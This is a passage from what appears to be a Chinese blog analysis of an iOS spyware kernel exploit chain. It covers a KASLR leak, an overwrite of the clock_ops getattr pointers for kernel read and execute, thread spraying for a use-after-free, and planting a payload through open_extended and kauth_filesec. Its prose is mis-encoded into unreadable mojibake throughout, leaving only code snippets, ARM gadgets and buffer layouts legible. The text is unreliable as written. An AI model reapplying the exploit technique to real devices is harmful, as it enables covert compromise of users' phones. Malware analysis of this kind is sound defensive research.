ˆåŒºçš„æœ«å°¾å€¼å¹¶å°†è¯»åˆ°çš„æ•°æ®å¤‡ä»½åˆ°å†…æ ¸å †åŒºä¸­ã€‚æ¥ç€<strong>IORegistryEntryGetProperty</strong>è¿™ä¸ªå‡½æ•°ä¼šå°†è¿™æ®µå †ç¼“å†²åŒºè¿”å›åˆ°ç”¨æˆ·ç©ºé—´ä¸­ã€‚å› æ­¤ï¼Œæ ˆå¤´éƒ¨æŒ‡é’ˆä¼šè¢«ç”¨æˆ·è¯»å–ï¼Œæ¥ç€åˆ©ç”¨è¿™ä¸ªæŒ‡é’ˆæ¥è®¡ç®—iOSå†…æ ¸åŸºå€ï¼š<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;<span class="keyword">while</span> (IORegistryEntryGetProperty_0(v13, <span class="string">"HIDKeyboardModifierMappingSrc"</span>,dataBuffer,&amp;size)</span><br><span class="line">);</span><br><span class="line">writeLog(<span class="number">7</span>,<span class="string">"%.2s%5.5d\n"</span>,<span class="string">"kaslr.c"</span>,<span class="number">127</span>);</span><br><span class="line"><span class="keyword">if</span>(size&gt;<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">writeLog(<span class="number">7</span>,<span class="string">"%.2s%5.5d\n"</span>,<span class="string">"kaslr.c"</span>,<span class="number">138</span>);</span><br><span class="line"><span class="keyword">return</span> dataBuffer[index]&amp;<span class="number">0xFFF00000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>éœ€è¦ç‰¹åˆ«æ³¨æ„è¿™æ®µä»£ç çš„ä¸¤ä¸ªæ–¹é¢ã€‚ç¬¬ä¸€ï¼Œpropertiesæ•°ç»„æŒ‡å®š<strong>OSNumber</strong>çš„å€¼æ˜¯256å­—èŠ‚å¤§å°ï¼Œè¿™ä¸ªå€¼ä¼šæœ€ç»ˆå¯¼è‡´æ•°æ®æ³„éœ²ã€‚ç¬¬äºŒï¼Œ<em>index</em>å€¼ä¼šå› å‹å·å’ŒiOSç‰ˆæœ¬ä¸åŒè€Œä¸åŒï¼Œè¿™ä¸ªå€¼å­˜å‚¨åœ¨<em>dataBuffer</em>ä¸­ï¼Œç”¨æ¥æ‰¾åˆ°å†…å­˜åœ°å€ã€‚é˜¶æ®µäºŒçš„å¼€å‘è€…å·²ç»è§„åˆ’äº†æ¯ä¸ªå‹å·å’ŒiOSç‰ˆæœ¬çš„ç»„åˆé¡¹ï¼Œç¡®å®š<em>dataBuffer</em>é‚£ä¸ªåœ°å€å€¼æ˜¯æœ‰æ•ˆçš„å†…æ ¸åœ°å€ã€‚</p><p>å¦‚æœä¸Šè¿°æ–¹æ³•ä¸è¶³ä»¥æ‰¾åˆ°å†…æ ¸åŸºå€æˆ–è€…å‘ç°iOSç‰ˆæœ¬ä¸æ˜¯9ï¼Œæ–­è¨€å›è°ƒå¯åŠ¨ç¨‹åºç»ˆæ­¢ã€‚</p><h4 id="åœ¨å—å®³è®¾å¤‡ä¸Šå»ºç«‹è¯»-å†™-æ‰§è¡ŒåŸè¯­ï¼ˆ32bitï¼‰"><a href="#åœ¨å—å®³è®¾å¤‡ä¸Šå»ºç«‹è¯»-å†™-æ‰§è¡ŒåŸè¯­ï¼ˆ32bitï¼‰" class="headerlink" title="åœ¨å—å®³è®¾å¤‡ä¸Šå»ºç«‹è¯»/å†™/æ‰§è¡ŒåŸè¯­ï¼ˆ32bitï¼‰"></a>åœ¨å—å®³è®¾å¤‡ä¸Šå»ºç«‹è¯»/å†™/æ‰§è¡ŒåŸè¯­ï¼ˆ32bitï¼‰</h4><p>æ‰¾åˆ°å†…æ ¸åŸºå€åï¼Œé˜¶æ®µäºŒçš„32åŒ…é€šè¿‡pipeå‡½æ•°ç”Ÿæˆä¸€ä¸ªIPCã€‚å¦‚æœpipeå‘½ä»¤å¤±è´¥ï¼Œå°±ä¼šåœæ­¢æ”»å‡»ã€‚ç”ŸæˆIPCåï¼Œ32åŒ…ç”¨ä¸€ä¸ªå†…æ ¸ç«¯å£å¾—åˆ°æ—¶é’ŸæœåŠ¡ï¼Œé€šè¿‡<strong>host_get_clock_service</strong>å¾—åˆ°ç”µæ± æ—¶é’Ÿï¼ˆè‘—åçš„æ—¥å†æ—¶é’Ÿï¼‰å’Œå®æ—¶æ—¶é’Ÿã€‚å¦‚æœä»»ä¸€æ—¶é’Ÿä¸å¯è¾¾ï¼Œæ”»å‡»å°±ä¼šåœæ­¢ã€‚å› ä¸ºæ¥ä¸‹æ¥ç”¨è¿™ä¸‰ä¸ªå¯¹è±¡ï¼ˆpipe setå’Œä¸¤ä¸ªæ—¶é’Ÿå¯¹è±¡ï¼‰è·å–å†…æ ¸è¯»å†™æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥è¿™ä¸‰ä¸ªå¯¹è±¡éå¸¸é‡è¦ã€‚</p><p>ç´§è·Ÿç€<em>pipe</em>å’Œ<em>host_get_clock_service calls</em>ï¼Œ32åŒ…æ£€æŸ¥å‘å‰é€šè¿‡<strong>task_from_pid</strong>åˆ›å»ºçš„å†…æ ¸ç«¯å£å€¼ã€‚å¦‚æœ<strong>task_from_pid</strong>è¿”å›äº†ä¸€ä¸ªæœ‰æ•ˆå€¼ï¼ˆä¸æ˜¯NULLï¼‰ï¼Œ32åŒ…ç”¨<em>vm_write</em>å†™å…¥20å­—èŠ‚çš„æ•°æ®å—ï¼Œæ¥ä¿®æ”¹å†…æ ¸ç©ºé—´ã€‚è¿™ä¸ª20å­—èŠ‚æ•°æ®è¦†ç›–äº†<em>clock_ops</em>çš„ä¸€éƒ¨åˆ†ã€‚</p><p>å½“è°ƒç”¨ä¾‹å¦‚<em>clock_get_attributes</em>å‡½æ•°æ—¶ï¼Œå†…æ ¸ä¼šè°ƒç”¨ç”µæ± æ—¶é’Ÿå’Œå®æ—¶æ—¶é’Ÿç›¸å…³çš„å‡½æ•°ï¼Œè¿™ä¸ª20å­—èŠ‚æ•°æ®å°±åŒ…å«äº†è¿™äº›å‡½æ•°çš„æŒ‡é’ˆã€‚æ•°æ®å—ç”¨ç°å­˜çš„å†…æ ¸å‡½æ•°æ›¿ä»£äº†ä¸¤ç§æ—¶é’Ÿç±»å‹çš„<em>getattr</em>æ“ä½œè¯­ã€‚ç‰¹åˆ«çš„æ˜¯ï¼Œå®æ—¶æ—¶é’Ÿçš„<em>getattr</em>è¢«ä¿®æ”¹æˆæŒ‡å‘<strong>OSSerializer::serialize</strong>çš„æŒ‡é’ˆï¼Œç”µæ± æ—¶é’Ÿçš„<em>getattr</em>æ”¹æˆæŒ‡å‘<strong>_bufattr_cpx</strong>çš„æŒ‡é’ˆã€‚</p><p>å½“ä¸¤ä¸ªæ—¶é’Ÿè°ƒç”¨<em>clock_get_attributes</em>æ—¶ï¼Œä¼šæ”¹å˜å…¶åŸæœ‰çš„æ‰§è¡Œç»“æœã€‚ä¾‹å¦‚ç”µæ± æ—¶é’Ÿè°ƒç”¨<em>clock_get_attributes</em>æ—¶ï¼Œç›¸å½“ä¸è°ƒç”¨äº†å†…æ ¸ç©ºé—´è¯»å‡½æ•°ã€‚<strong>_bufattr_cpx</strong>åªæœ‰ä¸¤ä¸ªå±æ€§ï¼š<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_bufattr_cpx:</span><br><span class="line">LDR        R0,[R0]</span><br><span class="line">BX          LR</span><br></pre></td></tr></table></figure></p><p>R0é‡Œå­˜å‚¨ç€ä¸€ä¸ªå†…å­˜åœ°å€ï¼Œè¿™æ˜¯è¿™ä¸ªå‡½æ•°è¯»å–çš„ï¼Œåœ¨è¿”å›è°ƒç”¨å‡½æ•°å‰å†™å…¥R0ä¸­ã€‚iPhoneåŸºäºARMæ¡†æ¶çš„å‡½æ•°è°ƒç”¨ä½¿ç”¨å¯„å­˜å™¨å­˜å‚¨å‰å››ä¸ªå‡½æ•°å‚æ•°ï¼Œè™½ç„¶<strong>getattr</strong>ä½¿ç”¨äº†ä¸‰ä¸ªå‚æ•°ï¼Œä½†ç¼ºå°‘å®Œå…¨å…¼å®¹çš„å‡½æ•°åŸå‹æ²¡æœ‰å…³ç³»ã€‚</p><p>æ›¿ä»£äº†å®æ—¶æ—¶é’Ÿ<strong>getattr</strong>çš„å‡½æ•°æ›´åŠ å¤æ‚ã€‚<strong>OSSerializer::serialize</strong>å‡½æ•°å°†<em>OSSerializer </em>å¯¹è±¡ï¼ˆåŒ…å«è™šå‡½æ•°è¡¨ï¼ˆvtableï¼‰ï¼‰ä½œä¸º<em>this</em>æŒ‡é’ˆã€‚å‡½æ•°è°ƒç”¨<em> OSSerializer </em>å¯¹è±¡0x10å¤„çš„åœ°å€å¹¶é€šè¿‡BXå‘½ä»¤æ¥æ‘†è„±æ§åˆ¶ï¼Œå‘ä¸‹ä¸€ä¸ªå‡½æ•°ä¼ å…¥DWORDsé‡Œ8å’Œ12åç§»å¤„çš„å€¼ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_DWORD OSSerializer::serialize(OSSerialize *):</span><br><span class="line">LDR      R3,[R0,#<span class="number">8</span>]</span><br><span class="line">MOV    R2,R1</span><br><span class="line">LDR      R1,[R0,#<span class="number">0xC</span>]</span><br><span class="line">LDR.W  R12,[R0,#<span class="number">0x10</span>]</span><br><span class="line">MOV     R0,R3</span><br><span class="line">BX         R12</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡ä¸€æ®µç‰¹æ®Šè®¾è®¡çš„æ•°æ®å—ï¼Œæ¥ä¸‹æ¥ä¼šè¯¦ç»†è°ˆåˆ°ï¼Œç°åœ¨è°ƒç”¨<em>clock_get_attributes</em>å°±å¯ä»¥åœ¨å†…æ ¸å†…æ‰§è¡Œä»»æ„å‡½æ•°ã€‚å¦‚æœå—å®³è€…çš„å†…æ ¸å·²ç»ä»¥æŸç§æ–¹å¼æš´éœ²äº†ï¼Œè¿™ç§æ—¶é’Ÿä¿®æ”¹æ‰å¯èƒ½å‘ç”Ÿï¼Œè¿™æ˜¯å€¼å¾—æ³¨æ„çš„ã€‚æ‰€ä»¥ï¼Œå¦‚æœåœ¨ä¸€ä¸ªæ²¡æœ‰è¶Šç‹±çš„æ‰‹æœºä¸Šï¼Œä¿®æ”¹å¯èƒ½ä¸æˆåŠŸã€‚</p><p>å¦‚æœ32åŒ…å·²ç»è·å¾—äº†å†…æ ¸ç«¯å£å¹¶ä¸”å®Œæˆäº†ä¸Šè¿°å¯¹ä¸åŒæ—¶é’Ÿçš„ä¿®æ”¹ï¼Œä¼šç•¥è¿‡æ¥ä¸‹æ¥çš„å‡ ä¸ªæ­¥éª¤ï¼Œè·å–è®¿é—®æƒï¼Œé€æ­¥æå‡æƒé™ã€‚å¦‚æœå› ç°é˜¶æ®µå†…æ ¸ç«¯å£ä¸å¯ç”¨ï¼Œä½¿å†…æ ¸ä¿®æ”¹å¤±è´¥ï¼Œ32åŒ…åˆ›å»ºå¹¶é”å‘å‰åˆå§‹åŒ–é˜¶æ®µçš„é”å®šæ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶éå¸¸é‡è¦ï¼Œå› ä¸ºåé¢è·å¾—å†…æ ¸æ”¹å†™æƒé™ä¼šä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ã€‚</p><p>64ä½åŒ…ä¸ä¼šåˆ©ç”¨å·²è¶Šç‹±æ‰‹æœºä¸Šçš„åé—¨ã€‚</p><h4 id="çº¿ç¨‹æ“ä½œ"><a href="#çº¿ç¨‹æ“ä½œ" class="headerlink" title="çº¿ç¨‹æ“ä½œ"></a>çº¿ç¨‹æ“ä½œ</h4><p>ä¸ºåœ¨å†…æ ¸ä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œæœ€ç»ˆé˜¶æ®µäºŒä¼šåˆ©ç”¨ä¸€ä¸ªUFAï¼ˆuse after freeï¼‰æ¼æ´ã€‚å½“é—´æ¥å¼•ç”¨çš„å†…å­˜åŒºåŸŸï¼ˆæ¼æ´æƒ³è¦æ§åˆ¶çš„ï¼‰åœ¨æ¼æ´åˆ©ç”¨å¼€å§‹å‰åˆ†é…ç»™äº†å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™æ—¶ç«äº‰çŠ¶å†µäº§ç”Ÿäº†ã€‚å…¶ä»–çº¿ç¨‹å¯èƒ½çªç„¶ç”³è¯·ä¸€æ®µé‡è¦çš„å·²é‡Šæ”¾åŒºåŸŸï¼Œä¸ºé™ä½è¿™ç§å¯èƒ½æ€§ï¼Œé˜¶æ®µäºŒä¼šåˆ›å»ºéå¸¸å¤šçš„çº¿ç¨‹ï¼Œå¹¶ç«‹åˆ»å°†æ¯ä¸ªçº¿ç¨‹ï¼ˆä¸»çº¿ç¨‹ä¹‹å¤–çš„ï¼‰æš‚åœã€‚æ¥ç€ï¼Œé˜¶æ®µäºŒä¸ºä¸»çº¿ç¨‹ä¿®æ”¹æ—¶åˆ»è¡¨ç­–ç•¥ï¼Œä½¿åˆ©ç”¨UAFæ—¶ä¸ä¼šç¢°åˆ°å†…å­˜ç«äº‰å ç”¨çš„æƒ…å†µçš„å¯èƒ½æ€§å¤§å¤§å¢åŠ ã€‚</p><p>é˜¶æ®µäºŒ64ä½ç‰ˆæœ¬ä¸­è¿˜æœ‰é¢å¤–çš„ä¸€ä¸ªæ­¥éª¤ã€‚åœ¨çº¿ç¨‹æ—¶åˆ»è¡¨ä¿®æ”¹å®Œæˆåï¼Œé˜¶æ®µäºŒä¼šåˆ›å»º1000ä¸ªçº¿ç¨‹ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½å«æœ‰ä¸€ä¸ªå•ç´§ç¯ï¼Œè¿™ä¸ªå¾ªç¯ç­‰å¾…å…¨å±€å˜é‡é™è‡³é¢„å®šä¹‰å€¼ä»¥ä¸‹ï¼ˆå€¼å°äº0ï¼‰ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿ï¼ˆè‡³å°‘ï¼Œå¢åŠ å¯èƒ½æ€§ï¼‰æ²¡æœ‰å…¶ä»–çš„çº¿ç¨‹ä¼šäº‰å¤ºUFAç›®æ ‡å†…å­˜å—ã€‚</p><h4 id="å»ºç«‹é€šä¿¡éš§é“ï¼ˆ32ä½ï¼‰"><a href="#å»ºç«‹é€šä¿¡éš§é“ï¼ˆ32ä½ï¼‰" class="headerlink" title="å»ºç«‹é€šä¿¡éš§é“ï¼ˆ32ä½ï¼‰"></a>å»ºç«‹é€šä¿¡éš§é“ï¼ˆ32ä½ï¼‰</h4><p>é˜¶æ®µäºŒ32åŒ…åˆ©ç”¨pipeå‘½ä»¤åˆ›å»ºå¦ä¸€ä¸ª<em>pipe</em>ï¼Œé‡æ–°ä½¿ç”¨åŸå…ˆç”Ÿæˆçš„<em>pipe</em>çš„å˜é‡ã€‚åœ¨è°ƒç”¨<em>host_get_clock_service</em>ä¹‹åï¼Œè¿™ä¸ªå‘½ä»¤ç«‹åˆ»æ‰§è¡Œï¼Œä»¥è·å¾—å®æ—¶å’Œç”µæ± æ—¶é’Ÿã€‚å› è¿™ä¸ªpipeï¼Œ<em>host_get_clock_service</em>å†ä½¿ç”¨äº†ä¹‹å‰ä¸ºè·å¾—ä¸åŒæ—¶é’Ÿç«¯å£<em>host_get_clock_service</em>ä½¿ç”¨çš„å˜é‡ã€‚</p><p>å…ˆå‰ç”Ÿæˆçš„<em>pipe</em>å’Œæ—¶é’Ÿç«¯å£éå¸¸å…³é”®ï¼Œå› ä¸ºæ¥ä¸‹æ¥çš„å†…æ ¸æ“ä½œä¼šç”¨åˆ°ï¼Œå¦‚æœå†…æ ¸ä»»åŠ¡ç«¯å£æ—©å·²å¯å¾—ï¼Œ<strong>32Stage2</strong>ä¼šç•¥è¿‡è¿™ä¸ªå¯¹ä¿®æ”¹å†…æ ¸å¾ˆé‡è¦çš„è¿‡ç¨‹è€Œæ˜¯ç›´æ¥è°ƒç”¨<em>vm_write</em>æ¥ä¿®æ”¹å†…æ ¸ã€‚ç„¶è€Œï¼Œå¦‚æœ<strong>32Stage2</strong>æ²¡æœ‰å¾—åˆ°å†…æ ¸ä»»åŠ¡ç«¯å£ï¼ˆæ‰‹æœºæ²¡æœ‰è¶Šç‹±çš„æƒ…å†µï¼‰ï¼Œæ¼æ´åˆ©ç”¨å°±å¾ˆé‡è¦ã€‚ä½œä¸ºæ”»å‡»çš„ä¸€éƒ¨åˆ†ï¼Œ32Stage2åœ¨æ”»å‡»å‰å‘è¦è·å¾—<em>pipe</em>ç»„å’Œæ—¶é’Ÿï¼Œå› æ­¤äºŒè¿›åˆ¶åŒ…å¯ä»¥ç¡®ä¿è·å¾—ã€‚å°½ç®¡æ²¡å¿…è¦é‡å¤ï¼Œè¿™æ˜¯ä¸ºç¡®ä¿é‡è¦çš„å¯¹è±¡å¯è¾¾ã€‚</p><p>å‡å®šç”¨äºæœ€ç»ˆè°ƒç”¨å‡½æ•°çš„è§¦å‘æœºåˆ¶åªä¸è¿‡æ˜¯å°†ç°æœ‰å‡½æ•°æŒ‡é’ˆé‡å®šå‘åˆ°sysctlå¤„ç†ç¨‹åºï¼Œ64ä½åŒ…ä¸ç”¨æ‰§è¡Œè¿™ä¸€æ­¥éª¤ã€‚</p><h4 id="payloadæ„é€ å’Œå†…æ ¸æ’å…¥"><a href="#payloadæ„é€ å’Œå†…æ ¸æ’å…¥" class="headerlink" title="payloadæ„é€ å’Œå†…æ ¸æ’å…¥"></a>payloadæ„é€ å’Œå†…æ ¸æ’å…¥</h4><p>å¦‚æœä¸èƒ½é€šè¿‡å†…æ ¸ç«¯å£ä¿®æ”¹å†…æ ¸å­˜å‚¨ç©ºé—´ï¼Œ<strong>32Stage2</strong>å¿…é¡»åˆ©ç”¨iOSå·²å­˜æ¼æ´å»æ§åˆ¶å†…æ ¸ã€‚å…¶æ„é€ äº†ä¸¤ä¸ªæ•°æ®ç¼“å†²å—ï¼šåŒ…å«ä¿®æ”¹å®æ—¶å’Œç”µæ± æ—¶é’Ÿçš„20å­—èŠ‚çš„å…³é”®è¦†ç›–æ•°æ®å’Œ38å­—èŠ‚çš„ä¸€æ®µpayloadï¼Œä¼šè¿è¡Œä¸€ç³»åˆ—å°ç¨‹åºæ¥å®‰è£…æ—¶é’Ÿè¦†ç›–ç¨‹åºã€‚å¦‚ä¸‹ï¼š<br><strong>clock_ops_overwrite</strong> ç¼“å­˜åŒºï¼š</p><pre><code>[00] (rtclock.getattr):address of OSSerializer::serialize[04] (calend_config):NULL[08] (calend_init):NULL[0C] (calend_gettime):address of calen_gatattr[10] (calend_getattr):address of _bufattr_cpx</code></pre><p><strong>uaf_payload_buffer</strong>æ”»å‡»åˆ©ç”¨çš„ç¼“å­˜åŒºï¼š</p><pre><code>[00] ptr to clock_ops_overwrite buffer[04] address of clock_ops array in kern memory[08] address of _copyin[0C] NULL[10] address of OSSerializer::serialize[14] address of &quot;BX LR&quot; code fragment[18] NULL[1C] address of OSSymbol::getMetaClass[20] address of &quot;BX LR&quot; code fragment[24] address of &quot;BX LR&quot; code fragment</code></pre><p><strong>32Stage2</strong>åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹æ¥å¤„ç†å®‰è£…ä¸€æ–°çš„æ—¶é’Ÿå¤„ç†ç¨‹åºæ‰€éœ€è¦çš„åˆå§‹æ“ä½œï¼Œä½†è¿™ä¸ªæ–°çº¿ç¨‹ä¸ä¼šè¿›è¡Œå®‰è£…ã€‚è¿™ä¸ªçº¿ç¨‹åœ¨æ ˆä¸Šåˆ›å»º<strong>kauth_filesec</strong>æ•°æ®å—ï¼š</p><pre><code>.fsec_magic=KAUTH_FILESEC_MAGIC; //0x12CC16D.fsec.owner=&lt;undetermind, random stack value&gt;;.fsec.group=&lt;undetermind, random stack value&gt;;.fsec_acl.entrycount=KAUTH_FILESEC_NOACL;//-1</code></pre><p><em>uaf_payload_buffer</em>æ·»åŠ åˆ°<em>kauth _filesec</em>ä¸­çš„<strong>kauth_filesec.fsec_acl.acl_ace[]</strong>æ•°ç»„æœ«å°¾å¤„ã€‚è¿™ä¸ªä¼šåœ¨IOKitä¸Šå¼€è®¾ä¸€ä¸ªç«¯å£ï¼Œä¸ºAppleKeyStoreè°ƒç”¨I<em>OServiceGetMatchingService</em>ã€‚è¯¥çº¿ç¨‹åˆ©ç”¨ä¸è·å–å†…æ ¸åœ°å€ç›¸åŒçš„æ–¹æ³•ï¼Œè·å¾—ä¸€æ®µæœ‰æ•ˆçš„å†…æ ¸å†…å­˜ç©ºé—´ã€‚æ–°çº¿ç¨‹å’Œä¹‹å‰ç›¸åŒæ“ä½œä¸åŒä¹‹å¤„åœ¨äºå±æ€§åç§°ä¸åŒï¼ˆæ–°çº¿ç¨‹ä½¿ç”¨â€œarararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararaâ€ï¼‰ã€‚</p><p>æ¥ç€ï¼Œ<strong>open_extended </strong>è°ƒç”¨<em>syscall</em>ã€‚32åŒ…å°†é”å®šæ–‡ä»¶çš„åœ°å€ä¼ åˆ°syscallï¼Œè¿˜æœ‰KAUTH_UID_NONEå’ŒKAUTH_GID_NONEä¸¤ä¸ªå‚æ•°å€¼ï¼Œåœ¨çº¿ç¨‹å¼€å§‹æ—¶ï¼Œåˆ›å»º<strong>kauth_filesec</strong>ã€‚<strong>open_extended</strong>ä¼šæ‰§è¡Œä¸‹åˆ—ä»£ç ï¼š</p><pre><code>if ((uap-&gt;xsecurity!=USER_ADD_NULL)&amp;&amp;    ((ciferrror=kauth_copyinfilesec(uap-&gt;xsecurity,&amp;xsecdst))!=0))</code></pre><p><strong>kauth_copyinfilesec</strong>ä»ç”¨æˆ·å—ä¸­å¤åˆ¶<strong>kauth_filesec </strong>åˆ°å†…æ ¸å—ä¸­çš„<strong>kauth_filesec </strong>æ•°æ®å—ä¸­ã€‚<strong>kauth_filesec </strong>åˆ¶ä½œäº†ä¸€ä¸ªè®¿é—®æ§åˆ¶åˆ—è¡¨(acl)åŒ…å«è®¿é—®æ§åˆ¶å…¥å£(ace)ã€‚å¦‚ä¸‹ï¼š</p><pre><code>/* FILE SECURITY information */struct kauth_filesec{    u_int32_t        fsec_magic;    guid_t            fsec_owner;    guid_t            fsec_group;    struct kauth_acl fsec_acl;}ï¼›</code></pre><p>ACLå‚¨å­˜åœ¨<strong>kauth_acl</strong> ï¼Œå¦‚ä¸‹ï¼š</p><pre><code>/* Access Contro List */struct kauth_acl{    u_int32_t        acl_entrycount;    u_int32_t        acl_flags;    struct kauth_ace acl_ace[1];};</code></pre><p><strong>kauth_ace</strong>æœ‰24å­—èŠ‚ï¼Œå¦‚ä¸‹ï¼š</p><pre><code>typedef u_int32_t kauth_ace_rights_t;/* Access Control List Entry (ACE) */struct kauth_ace{    guid_t        ace_applicable;    u_int32_t    ace_flags;    kauth_ace_rights_t    ace_rights;                    /*scope specific*/};</code></pre><p><strong>kauth_acl</strong>é‡Œçš„<strong>acl_entrycount</strong>æ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´å‹ï¼Œå®šä¹‰äº†acl_aceæ•°ç»„é‡Œæœ‰å¤šå°‘ä¸ª<strong>kauth_ace</strong>å…¥å£ã€‚å¦‚æœACLé‡Œæ²¡æœ‰ACEè®°å½•ï¼Œacl_entrycountä¼šå®šä¹‰ä¸ºKAUTH_FILESEC_NOACLï¼Œè¿™ä¸ªå€¼ä¸º-1ã€‚åœ¨<strong>kauth_copyinfilesec</strong>ä¸­å‘ç°å¦‚ä¸‹æ³¨é‡Šã€‚</p><pre><code>/*     çŒœæµ‹filesecçš„å¤§å°ã€‚ä»åŸºæŒ‡é’ˆå¼€å§‹ï¼Œ    çœ‹çœ‹è¿˜æœ‰é¡µé¢ä¸Šè¿˜æœ‰å¤šå°‘ç©ºé—´å‰©ä½™ï¼Œ    è£å‰ªåˆ°åˆç†çš„ä¸Šç•Œã€‚å¦‚æœç©ºé—´ä¸å¤Ÿï¼Œ    é‡æ–°åŸºäºå®é™…ACLç©ºé—´å¤§å°å®šä¹‰ï¼Œé‡æ–°å¼€å§‹ã€‚    ä¸Šå±Šå€¼å¿…é¡»å°äºKAUTH_ACL_MAX_ENTRIESã€‚    ä½†å¯ä»»æ„å–å€¼ï¼Œ0ä¹Ÿå¯ä»¥ã€‚*/</code></pre><p>å½“è¯¥çº¿ç¨‹æ„å»ºäº†kauth_filesecï¼Œä¼šç›´æ¥æ“æ§æ ˆä¸Šçš„æ•°æ®å—åœ°å€ï¼Œå¦‚ä¸‹ï¼š</p><pre><code>//get stack addressp=(unsigned int)&amp;stackAnchor &amp; 0xFFFFFF000;//kauth_filesec.fsec_magic(p+0xEC0)=0x12CC16D;//kauth_filesec.fsec_acl.entrycount=KAUTH_FILESEC_NOACL(p+0xEE4)=-1;//kauth_filesec.fsec_acl.acl_ace[...]memcpy(&amp;stackAnchor &amp; 0xFFFFF000 | 0xEEC, pExploit, 128);</code></pre><p>å †æ ˆåœ¨æ–°çº¿ç¨‹æ‰§è¡Œå¼€å§‹æ—¶å†…å®¹å¦‚ä¸‹ï¼š</p><pre><code>char stackAnchor; //[sp+101Fh] [bp-2031h]@1unsigned int size; //[sp+2020h] [bp-2013h]@12char buffer[4096]; //[sp+2024h] [bp-102h]@12int v26; //[sp+3024h] [bp-2Ch]@7mach_port_t connection; //[sp+3028h] [hp-28h]@4kern_return_t result; //[sp+320Ch] [bp-24h]@4mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST</code></pre><p>è¯¥æ–°çº¿ç¨‹åˆ©ç”¨<em>stackAnchor</em>å˜é‡æ‰¾åˆ°æ ˆçš„ä¸€ä¸ªé¡µè¾¹ç•Œå€¼ã€‚æ¥ç€ï¼Œçº¿ç¨‹åˆ›å»ºä¸€ä¸ªéå¸¸å¤§çš„æ•°ç»„ï¼Œç¡®ä¿è‡³å°‘æ ˆä¸Šçš„ä¸€é¡µç©ºé—´ä¸ä¼šåˆ†é…ç»™å‡½æ•°å…³é”®å˜é‡ï¼Œå°±å¯ä»¥åˆ›å»ºä¸€ä¸ª<em>kauth_filesec</em>ç»“æ„å—ï¼Œå…¶åŒ…å«äº†æ¯”å¿…éœ€çš„æ›´å¤šçš„ä¿¡æ¯ã€‚é€šè¿‡è®¾ç½®<strong>acl_entrycount</strong>å»å‘ç³»ç»Ÿè¯´æ˜æ²¡æœ‰ACEé¡¹ï¼Œåˆ™å½“<em>open_extended </em>åŠ è½½<em>kauth_filesec</em>æ—¶ï¼Œå…¶ä¸ä¼šè§£æ<em>acl _ flags </em>ä»¥å¤–çš„ä»»ä½•æ•°ç»„ã€‚å› æ­¤ä¿æŠ¤äº†æ”»å‡»ç¼“å†²åŒºçš„å®Œæ•´æ€§ï¼Œå¹¶é˜²æ­¢å› æ”»å‡»ç¼“å†²åŒºä½œä¸ºä¸€çœŸçš„ACEä¼šè¢«ä¸­æ–­ï¼Œå†…æ ¸å¯èƒ½å› æ­¤äº§ç”Ÿé”™è¯¯ã€‚æœ€ç»ˆ<em>open_extended</em>ä¼šå°†æ”»å‡»ç¼“å†²åŒºï¼ˆä»¥åŠ<em>clock _ ops _ overwrite </em>ç¼“å†²åŒºï¼‰çš„å†…å®¹å¤åˆ¶åˆ°å†…æ ¸åŒºåŸŸä¸­ã€‚</p><p>æ–°çº¿ç¨‹åˆ©ç”¨<em>open_extended </em>çš„æ¼æ´å°†æœªä¿®æ”¹çš„<strong>payload</strong>æ”¾åˆ°äº†å†…æ ¸ä¸­ã€‚åˆ©ç”¨å…ˆå‰è®¨è®ºçš„æ¼æ´ï¼Œå³å…è®¸å†…æ ¸æ•°æ®æ³„éœ²è¿›ç”¨æˆ·å†…å­˜ä¸­ï¼Œå°±å¯ä»¥æ‰¾åˆ°<strong>payload</strong>çš„åœ°å€ã€‚å½“å®Œæˆäº†å¯¹<strong>AppleKeyStore</strong>æ¼æ´çš„æ”»å‡»ï¼Œ<em>buffer </em>å˜é‡ä¼ å‘<em>io_service_open_extended </em>ï¼ˆä½äºstackAnchoré™„è¿‘çš„ç›¸åŒå˜é‡ï¼‰ã€‚è¿™æ„å‘³ç€<em>AppleKeyStore </em>ä¼šè¿”å›æŒ‡å‘å†…æ ¸å—çš„æŒ‡é’ˆï¼ŒæŒ‡é’ˆæŒ‡å‘<em>open_extended </em>å¤åˆ¶è¿›å†…æ ¸çš„ä»£ç å—çš„åä¸€é¡¹ã€‚å› æ­¤ï¼Œæ–°çº¿ç¨‹çš„ç›®çš„ä¸æ˜¯é‡å†™æ—¶é’Ÿå¤„ç†ç¨‹åºæŒ‡é’ˆï¼Œè€Œæ˜¯ä¸ºè¿™æ 